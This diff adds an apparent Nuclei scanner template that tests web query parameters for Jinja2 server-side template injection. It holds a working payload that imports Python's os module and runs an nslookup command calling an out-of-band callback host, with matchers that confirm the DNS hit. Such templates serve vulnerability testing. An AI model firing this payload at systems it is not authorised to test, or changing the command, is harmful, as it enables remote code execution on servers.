@@ -1,0 +1,40 @@
+id: jinja2-oob
+
+info:
+  name: Jinja2 - Out of Band Template Injection
+  author: 0xAwali,DhiyaneshDK
+  severity: high
+  reference:
+    - https://pypi.org/project/Jinja2/
+    - https://medium.com/@0xAwali/template-engines-injection-101-4f2fe59e5756
+  metadata:
+    verified: true
+  tags: ssti,dast,oast,oob
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+
+    payloads:
+      injection:
+        - "{{self.__init__.__globals__.__builtins__.__import__('os').popen('nslookup+-type=SRV+{{interactsh-url}}').read()}}"
+
+    fuzzing:
+      - part: query
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{injection}}"
+
+    skip-variables-check: true
+
+    matchers:
+      - type: dsl
+        name: request-matcher
+        dsl:
+          - "contains(interactsh_protocol,'dns')"
+          - "contains(interactsh_request,'srv')"
+        condition: and
+# digest: 4a0a00473045022100c36c1a6798b1e6bb9c392bfff46e17330adf5499e7418bdbf4877753eaf6397b022076c200ecfcd423ec7249bbc97c500df8cc7e218fdbe1167017d9bf1e7f012ec6:922c64590222798bb761d5b6d8e72950
